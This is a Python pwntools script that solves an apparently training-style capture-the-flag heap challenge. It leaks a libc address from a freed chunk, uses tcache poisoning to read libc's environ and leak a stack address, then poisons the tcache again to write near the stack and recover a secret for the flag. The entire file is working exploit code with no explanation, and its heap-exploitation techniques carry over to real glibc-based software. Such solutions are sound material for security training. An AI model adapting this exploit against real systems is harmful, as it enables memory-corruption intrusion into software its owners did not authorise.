#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('/challenge/seeking-smuggled-secrets-hard', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x00000000004018F8
            b* 0x00000000004019FC
            b* 0x0000000000401ABB
            b* 0x0000000000401BDF
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

prompt = b"Function (malloc/free/puts/scanf/send_flag/quit): "

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def malloc(idx, sz):
    sla(prompt, b'malloc')
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())

def free(idx):
    sla(prompt, b'free')
    sla(b'Index: ', str(idx).encode())

def puts(idx):
    sla(prompt, b'puts')
    sla(b'Index: ', str(idx).encode())

def scanf(idx, dt):
    sla(prompt, b'scanf')
    sla(b'Index: ', str(idx).encode())
    p.sendline(dt)

def send_flag(dt):
    sla(prompt, b'send_flag')
    sla(b'Secret: ', dt)

secret = 0x422F26
malloc(0, 0x500)
malloc(1, 0x20)

free(0)
puts(0)
p.recvuntil(b'Data: ')
libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x1ecbe0
log.info(f'libc: {hex(libc.address)}')

malloc(2, 0x40)
malloc(3, 0x40)
free(2)
free(3)

scanf(3, p64(libc.sym.environ))

malloc(4, 0x40)
malloc(5, 0x40)
puts(5)
p.recvuntil(b'Data: ')
stack = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f'stack: {hex(stack)}')

malloc(6, 0x30)
malloc(7, 0x30)
free(6)
# GDB()
free(7)
target = stack - 0x218
scanf(7, p64(target))
malloc(8, 0x30)
# GDB()
malloc(9, 0x30)
scanf(9, p64(secret))
puts(0)
p.recvuntil(b'Data: ')
stack = p.recvline().strip()

send_flag(stack)

p.interactive()